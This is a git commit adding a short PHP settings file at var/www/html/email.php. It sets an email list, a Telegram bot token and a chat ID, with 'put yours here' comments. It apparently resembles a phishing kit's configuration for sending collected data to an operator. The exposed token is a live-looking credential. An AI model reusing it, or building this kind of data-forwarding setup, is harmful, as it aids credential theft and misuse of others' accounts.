5d0738f89c0e5031cef0a707b1873859dbd339bd
Test <test@example.com>
2024-08-15 00:37:35 +0530

    Extracted files

---
+++ var/www/html/email.php
@@ -0,0 +1,9 @@
+<?php
+
+
+$email = array("");  //PUT YOUR EMAIL HERE!!!
+$telegramTOKEN = "6646145027:AAEtPhp7tXFdeChOKSu0jL8KjLOYHfCx4cE"; //PUT YOUR TELEGRAM TOKEN HERE!!!
+$telegramID = "6384726066";   //PUT YOUR ID HERE!!!
+
+
+?>
